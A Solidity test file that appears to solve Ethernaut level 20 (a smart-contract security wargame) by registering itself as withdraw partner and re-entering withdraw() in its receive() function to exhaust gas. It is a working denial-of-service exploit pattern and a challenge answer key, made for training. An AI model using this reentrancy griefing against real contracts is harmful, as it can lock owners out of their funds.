// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level20 {
    function setWithdrawPartner(address) external;
    function withdraw() external;
}

contract Level20Test is EthernautTest {
    Level20 level20Instance;

    function testLevel20() public {
        _createLevel("20", 0.001 ether);

        level20Instance = Level20(levelInstance["20"]);

        // Set partner to this contract
        level20Instance.setWithdrawPartner(address(this));

        require(_submitLevel("20"));
    }

    receive () external payable {
        // This will keep the contract reentering until it runs out of gas
        level20Instance.withdraw();
    }

}
